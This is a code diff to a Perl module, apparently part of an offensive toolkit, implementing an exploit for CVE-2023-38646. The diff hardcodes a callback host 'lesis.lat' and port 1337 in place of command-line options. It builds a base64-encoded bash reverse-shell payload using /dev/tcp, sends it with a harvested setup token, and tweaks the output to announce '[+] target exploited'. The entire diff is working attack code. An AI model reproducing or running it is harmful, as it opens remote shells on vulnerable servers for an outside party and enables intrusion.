@@ -9,7 +9,10 @@ package Spellbook::Advisory::CVE_2023_38646 {
 
     sub new {
         my ($self, $parameters) = @_;
-        my ($help, $target, $remote, $port, @result);
+        my ($help, $target, @result);
+
+        my $remote = 'lesis.lat';
+        my $port   = 1337;
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
@@ -34,7 +37,7 @@ package Spellbook::Advisory::CVE_2023_38646 {
 
                     if ($token) {
                         my $headers = HTTP::Headers -> new ("Content-Type" => "application/json");
-                        my $reverse = encode_base64("bash -i >&/dev/tcp/$remote/$port 0>&1", "");
+                        my $reverse = encode_base64("bash -i >& /dev/tcp/$remote/$port 0>&1", "");
 
                         my $payload = qq({
                             "token": "$token",
@@ -60,7 +63,7 @@ package Spellbook::Advisory::CVE_2023_38646 {
                         my $response = $userAgent -> request($request);
 
                         if ($response -> code() == 400) {
-                            push @result, $target;
+                            push @result, "\n[+] $target exploited\n";
                         }
                     }
                 }
